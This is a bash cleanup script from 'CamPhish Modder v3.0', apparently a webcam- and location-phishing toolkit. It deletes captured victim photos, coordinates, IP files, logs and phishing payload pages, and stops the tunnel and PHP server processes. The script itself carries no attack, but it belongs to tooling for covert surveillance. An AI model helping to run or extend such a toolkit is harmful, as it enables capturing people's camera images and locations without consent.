#!/bin/bash
# ============================================================
#  CamPhish Modder v3.0 - Cleanup
# ============================================================
GREEN='\e[1;32m'; CYAN='\e[1;36m'; YELLOW='\e[1;33m'
MAGENTA='\e[1;35m'; WHITE='\e[1;97m'; GRAY='\e[0;37m'; RESET='\e[0m'

printf "${MAGENTA}╔═╗${RESET} ${WHITE}CamPhish Modder${RESET} ${GRAY}— cleanup${RESET}\n"

clean() {
  local label="$1"; shift
  printf "${CYAN}[*]${RESET} ${WHITE}%s...${RESET}\n" "$label"
  # shellcheck disable=SC2086
  rm -f $1 2>/dev/null
}

clean "ลบ log files" "*.log .cloudflared.log location_debug.log"
clean "ลบไฟล์พิกัดชั่วคราว" "location_*.txt current_location.txt current_location.bak saved.locations.txt ip.txt saved.ip.txt"
clean "ลบรูปที่ดักได้" "cam*.png .seen_cam*.png"
clean "ลบไฟล์ payload ชั่วคราว" "index.php index2.html index3.html sendlink"

if [ -d "saved_locations" ]; then
  printf "${CYAN}[*]${RESET} ${WHITE}ล้าง saved_locations/...${RESET}\n"
  rm -f saved_locations/* 2>/dev/null
  rmdir saved_locations 2>/dev/null
fi

printf "${CYAN}[*]${RESET} ${WHITE}หยุด processes ค้าง...${RESET}\n"
if command -v pkill > /dev/null 2>&1; then
  pkill -f "ngrok.*3333" 2>/dev/null
  pkill -f "cloudflared.*3333" 2>/dev/null
  # ฆ่าเฉพาะ php server ของเรา ไม่ฆ่า php ทั้งเครื่อง
  pkill -f "php -S.*3333" 2>/dev/null
elif command -v taskkill > /dev/null 2>&1; then
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  echo "  (ข้าม: ไม่มี pkill/taskkill)"
fi

printf "${GREEN}[+]${RESET} ${WHITE}Cleanup เสร็จแล้ว — CamPhish Modder พร้อมรันใหม่${RESET}\n"
